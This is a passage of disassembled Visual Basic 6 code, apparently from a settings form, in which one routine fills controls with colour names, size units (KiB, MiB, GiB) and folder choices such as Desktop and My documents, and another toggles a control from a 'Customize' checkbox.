008572FD: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00857302: mov var_20, 00455F40h ; Green
00857309: mov var_28, 00000008h
00857310: push 00000010h
00857312: pop eax
00857313: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857318: lea esi, var_28
0085731B: mov edi, esp
0085731D: movsd 
0085731E: movsd 
0085731F: movsd 
00857320: movsd 
00857321: push 00000001h
00857323: push 0000000Dh
00857325: mov eax, [ebp+08h]
00857328: mov eax, [eax]
0085732A: push [ebp+08h]
0085732D: call [eax+0000034Ch]
00857333: push eax
00857334: lea eax, var_18
00857337: push eax
00857338: call 00410A84h ; Set (object)
0085733D: push eax
0085733E: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00857343: add esp, 0000001Ch
00857346: lea ecx, var_18
00857349: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085734E: mov var_20, 00455F50h ; Magenta
00857355: mov var_28, 00000008h
0085735C: push 00000010h
0085735E: pop eax
0085735F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857364: lea esi, var_28
00857367: mov edi, esp
00857369: movsd 
0085736A: movsd 
0085736B: movsd 
0085736C: movsd 
0085736D: push 00000001h
0085736F: push 0000000Dh
00857371: mov eax, [ebp+08h]
00857374: mov eax, [eax]
00857376: push [ebp+08h]
00857379: call [eax+0000034Ch]
0085737F: push eax
00857380: lea eax, var_18
00857383: push eax
00857384: call 00410A84h ; Set (object)
00857389: push eax
0085738A: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0085738F: add esp, 0000001Ch
00857392: lea ecx, var_18
00857395: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085739A: mov var_20, 00455F64h ; Red
008573A1: mov var_28, 00000008h
008573A8: push 00000010h
008573AA: pop eax
008573AB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008573B0: lea esi, var_28
008573B3: mov edi, esp
008573B5: movsd 
008573B6: movsd 
008573B7: movsd 
008573B8: movsd 
008573B9: push 00000001h
008573BB: push 0000000Dh
008573BD: mov eax, [ebp+08h]
008573C0: mov eax, [eax]
008573C2: push [ebp+08h]
008573C5: call [eax+0000034Ch]
008573CB: push eax
008573CC: lea eax, var_18
008573CF: push eax
008573D0: call 00410A84h ; Set (object)
008573D5: push eax
008573D6: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008573DB: add esp, 0000001Ch
008573DE: lea ecx, var_18
008573E1: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008573E6: mov var_20, 00455F70h ; White
008573ED: mov var_28, 00000008h
008573F4: push 00000010h
008573F6: pop eax
008573F7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008573FC: lea esi, var_28
008573FF: mov edi, esp
00857401: movsd 
00857402: movsd 
00857403: movsd 
00857404: movsd 
00857405: push 00000001h
00857407: push 0000000Dh
00857409: mov eax, [ebp+08h]
0085740C: mov eax, [eax]
0085740E: push [ebp+08h]
00857411: call [eax+0000034Ch]
00857417: push eax
00857418: lea eax, var_18
0085741B: push eax
0085741C: call 00410A84h ; Set (object)
00857421: push eax
00857422: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00857427: add esp, 0000001Ch
0085742A: lea ecx, var_18
0085742D: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00857432: mov var_20, 00455F80h ; Yellow
00857439: mov var_28, 00000008h
00857440: push 00000010h
00857442: pop eax
00857443: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857448: lea esi, var_28
0085744B: mov edi, esp
0085744D: movsd 
0085744E: movsd 
0085744F: movsd 
00857450: movsd 
00857451: push 00000001h
00857453: push 0000000Dh
00857455: mov eax, [ebp+08h]
00857458: mov eax, [eax]
0085745A: push [ebp+08h]
0085745D: call [eax+0000034Ch]
00857463: push eax
00857464: lea eax, var_18
00857467: push eax
00857468: call 00410A84h ; Set (object)
0085746D: push eax
0085746E: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00857473: add esp, 0000001Ch
00857476: lea ecx, var_18
00857479: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085747E: mov var_20, 00455F70h ; White
00857485: mov var_28, 00000008h
0085748C: push 00000010h
0085748E: pop eax
0085748F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857494: lea esi, var_28
00857497: mov edi, esp
00857499: movsd 
0085749A: movsd 
0085749B: movsd 
0085749C: movsd 
0085749D: push 00000000h
0085749F: mov eax, [ebp+08h]
008574A2: mov eax, [eax]
008574A4: push [ebp+08h]
008574A7: call [eax+0000034Ch]
008574AD: push eax
008574AE: lea eax, var_18
008574B1: push eax
008574B2: call 00410A84h ; Set (object)
008574B7: push eax
008574B8: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
008574BD: lea ecx, var_18
008574C0: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008574C5: mov var_20, 00447A84h
008574CC: mov var_28, 00000008h
008574D3: push 00000010h
008574D5: pop eax
008574D6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008574DB: lea esi, var_28
008574DE: mov edi, esp
008574E0: movsd 
008574E1: movsd 
008574E2: movsd 
008574E3: movsd 
008574E4: push 00000001h
008574E6: push 0000000Dh
008574E8: mov eax, [ebp+08h]
008574EB: mov eax, [eax]
008574ED: push [ebp+08h]
008574F0: call [eax+00000330h]
008574F6: push eax
008574F7: lea eax, var_18
008574FA: push eax
008574FB: call 00410A84h ; Set (object)
00857500: push eax
00857501: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00857506: add esp, 0000001Ch
00857509: lea ecx, var_18
0085750C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00857511: mov var_20, 00455EECh ; KiB
00857518: mov var_28, 00000008h
0085751F: push 00000010h
00857521: pop eax
00857522: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857527: lea esi, var_28
0085752A: mov edi, esp
0085752C: movsd 
0085752D: movsd 
0085752E: movsd 
0085752F: movsd 
00857530: push 00000001h
00857532: push 0000000Dh
00857534: mov eax, [ebp+08h]
00857537: mov eax, [eax]
00857539: push [ebp+08h]
0085753C: call [eax+00000330h]
00857542: push eax
00857543: lea eax, var_18
00857546: push eax
00857547: call 00410A84h ; Set (object)
0085754C: push eax
0085754D: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00857552: add esp, 0000001Ch
00857555: lea ecx, var_18
00857558: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085755D: mov var_20, 00455EF8h ; MiB
00857564: mov var_28, 00000008h
0085756B: push 00000010h
0085756D: pop eax
0085756E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857573: lea esi, var_28
00857576: mov edi, esp
00857578: movsd 
00857579: movsd 
0085757A: movsd 
0085757B: movsd 
0085757C: push 00000001h
0085757E: push 0000000Dh
00857580: mov eax, [ebp+08h]
00857583: mov eax, [eax]
00857585: push [ebp+08h]
00857588: call [eax+00000330h]
0085758E: push eax
0085758F: lea eax, var_18
00857592: push eax
00857593: call 00410A84h ; Set (object)
00857598: push eax
00857599: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0085759E: add esp, 0000001Ch
008575A1: lea ecx, var_18
008575A4: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008575A9: mov var_20, 00455F04h ; GiB
008575B0: mov var_28, 00000008h
008575B7: push 00000010h
008575B9: pop eax
008575BA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008575BF: lea esi, var_28
008575C2: mov edi, esp
008575C4: movsd 
008575C5: movsd 
008575C6: movsd 
008575C7: movsd 
008575C8: push 00000001h
008575CA: push 0000000Dh
008575CC: mov eax, [ebp+08h]
008575CF: mov eax, [eax]
008575D1: push [ebp+08h]
008575D4: call [eax+00000330h]
008575DA: push eax
008575DB: lea eax, var_18
008575DE: push eax
008575DF: call 00410A84h ; Set (object)
008575E4: push eax
008575E5: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008575EA: add esp, 0000001Ch
008575ED: lea ecx, var_18
008575F0: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008575F5: mov var_20, 00455EECh ; KiB
008575FC: mov var_28, 00000008h
00857603: push 00000010h
00857605: pop eax
00857606: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0085760B: lea esi, var_28
0085760E: mov edi, esp
00857610: movsd 
00857611: movsd 
00857612: movsd 
00857613: movsd 
00857614: push 00000000h
00857616: mov eax, [ebp+08h]
00857619: mov eax, [eax]
0085761B: push [ebp+08h]
0085761E: call [eax+00000330h]
00857624: push eax
00857625: lea eax, var_18
00857628: push eax
00857629: call 00410A84h ; Set (object)
0085762E: push eax
0085762F: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
00857634: lea ecx, var_18
00857637: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085763C: mov var_20, 00455F94h ; Root
00857643: mov var_28, 00000008h
0085764A: push 00000010h
0085764C: pop eax
0085764D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857652: lea esi, var_28
00857655: mov edi, esp
00857657: movsd 
00857658: movsd 
00857659: movsd 
0085765A: movsd 
0085765B: push 00000001h
0085765D: push 0000000Dh
0085765F: mov eax, [ebp+08h]
00857662: mov eax, [eax]
00857664: push [ebp+08h]
00857667: call [eax+00000334h]
0085766D: push eax
0085766E: lea eax, var_18
00857671: push eax
00857672: call 00410A84h ; Set (object)
00857677: push eax
00857678: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0085767D: add esp, 0000001Ch
00857680: lea ecx, var_18
00857683: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00857688: mov var_20, 00455FA4h ; Homepath
0085768F: mov var_28, 00000008h
00857696: push 00000010h
00857698: pop eax
00857699: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0085769E: lea esi, var_28
008576A1: mov edi, esp
008576A3: movsd 
008576A4: movsd 
008576A5: movsd 
008576A6: movsd 
008576A7: push 00000001h
008576A9: push 0000000Dh
008576AB: mov eax, [ebp+08h]
008576AE: mov eax, [eax]
008576B0: push [ebp+08h]
008576B3: call [eax+00000334h]
008576B9: push eax
008576BA: lea eax, var_18
008576BD: push eax
008576BE: call 00410A84h ; Set (object)
008576C3: push eax
008576C4: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008576C9: add esp, 0000001Ch
008576CC: lea ecx, var_18
008576CF: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008576D4: mov var_20, 00455FBCh ; Desktop
008576DB: mov var_28, 00000008h
008576E2: push 00000010h
008576E4: pop eax
008576E5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008576EA: lea esi, var_28
008576ED: mov edi, esp
008576EF: movsd 
008576F0: movsd 
008576F1: movsd 
008576F2: movsd 
008576F3: push 00000001h
008576F5: push 0000000Dh
008576F7: mov eax, [ebp+08h]
008576FA: mov eax, [eax]
008576FC: push [ebp+08h]
008576FF: call [eax+00000334h]
00857705: push eax
00857706: lea eax, var_18
00857709: push eax
0085770A: call 00410A84h ; Set (object)
0085770F: push eax
00857710: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00857715: add esp, 0000001Ch
00857718: lea ecx, var_18
0085771B: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00857720: mov var_20, 00455E00h ; My documents
00857727: mov var_28, 00000008h
0085772E: push 00000010h
00857730: pop eax
00857731: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857736: lea esi, var_28
00857739: mov edi, esp
0085773B: movsd 
0085773C: movsd 
0085773D: movsd 
0085773E: movsd 
0085773F: push 00000001h
00857741: push 0000000Dh
00857743: mov eax, [ebp+08h]
00857746: mov eax, [eax]
00857748: push [ebp+08h]
0085774B: call [eax+00000334h]
00857751: push eax
00857752: lea eax, var_18
00857755: push eax
00857756: call 00410A84h ; Set (object)
0085775B: push eax
0085775C: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00857761: add esp, 0000001Ch
00857764: lea ecx, var_18
00857767: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085776C: mov var_20, 00455FA4h ; Homepath
00857773: mov var_28, 00000008h
0085777A: push 00000010h
0085777C: pop eax
0085777D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857782: lea esi, var_28
00857785: mov edi, esp
00857787: movsd 
00857788: movsd 
00857789: movsd 
0085778A: movsd 
0085778B: push 00000000h
0085778D: mov eax, [ebp+08h]
00857790: mov eax, [eax]
00857792: push [ebp+08h]
00857795: call [eax+00000334h]
0085779B: push eax
0085779C: lea eax, var_18
0085779F: push eax
008577A0: call 00410A84h ; Set (object)
008577A5: push eax
008577A6: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
008577AB: lea ecx, var_18
008577AE: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008577B3: mov var_04, 00000000h
008577BA: push 008577CBh
008577BF: jmp 8577CAh
008577C1: lea ecx, var_18
008577C4: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008577C9: ret 
End Sub

Private sub chkCustomize__854214
00854214: push ebp
00854215: mov ebp, esp
00854217: sub esp, 0000000Ch
0085421A: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0085421F: mov eax, fs:[00h]
00854225: push eax
00854226: mov fs:[00000000h], esp
0085422D: push 00000040h
0085422F: pop eax
00854230: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00854235: push ebx
00854236: push esi
00854237: push edi
00854238: mov var_0C, esp
0085423B: mov var_08, 0040C8A0h
00854242: mov eax, [ebp+08h]
00854245: and eax, 00000001h
00854248: mov var_04, eax
0085424B: mov eax, [ebp+08h]
0085424E: and al, FEh
00854250: mov [ebp+08h], eax
00854253: mov eax, [ebp+08h]
00854256: mov eax, [eax]
00854258: push [ebp+08h]
0085425B: call [eax+04h]
0085425E: push 00000000h
00854260: push 00000000h
00854262: mov eax, [ebp+08h]
00854265: mov eax, [eax]
00854267: push [ebp+08h]
0085426A: call [eax+00000360h]
00854270: push eax
00854271: lea eax, var_18
00854274: push eax
00854275: call 00410A84h ; Set (object)
0085427A: push eax
0085427B: lea eax, var_28
0085427E: push eax
0085427F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00854284: add esp, 00000010h
00854287: push eax
00854288: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0085428D: dec eax
0085428E: neg eax
00854290: sbb eax, eax
00854292: inc eax
00854293: neg eax
00854295: mov var_4C, ax
00854299: lea ecx, var_18
0085429C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008542A1: lea ecx, var_28
008542A4: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008542A9: movsx eax, word ptr var_4C
008542AD: test eax, eax
008542AF: jz 8542FAh
008542B1: or var_30, FFFFFFFFh
008542B5: mov var_38, 0000000Bh
008542BC: push 00000010h
008542BE: pop eax
008542BF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008542C4: lea esi, var_38
008542C7: mov edi, esp
008542C9: movsd 
008542CA: movsd 
008542CB: movsd 
008542CC: movsd 
008542CD: push 8001000Dh
008542D2: mov eax, [ebp+08h]
008542D5: mov eax, [eax]
008542D7: push [ebp+08h]
008542DA: call [eax+0000035Ch]
008542E0: push eax
008542E1: lea eax, var_18
008542E4: push eax
008542E5: call 00410A84h ; Set (object)
008542EA: push eax
008542EB: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
008542F0: lea ecx, var_18
008542F3: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008542F8: jmp 854341h
008542FA: and var_30, 00000000h
008542FE: mov var_38, 0000000Bh
00854305: push 00000010h
00854307: pop eax
00854308: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0085430D: lea esi, var_38
00854310: mov edi, esp
00854312: movsd 
00854313: movsd 
00854314: movsd 
00854315: movsd 
00854316: push 8001000Dh
0085431B: mov eax, [ebp+08h]
0085431E: mov eax, [eax]
00854320: push [ebp+08h]
00854323: call [eax+0000035Ch]
00854329: push eax
0085432A: lea eax, var_18
0085432D: push eax
0085432E: call 00410A84h ; Set (object)
00854333: push eax
00854334: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
00854339: lea ecx, var_18
0085433C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854341: mov var_04, 00000000h
00854348: push 00854361h
0085434D: jmp 854360h
0085434F: lea ecx, var_18
00854352: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854357: lea ecx, var_28
0085435A: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0085435F: ret 
End Sub

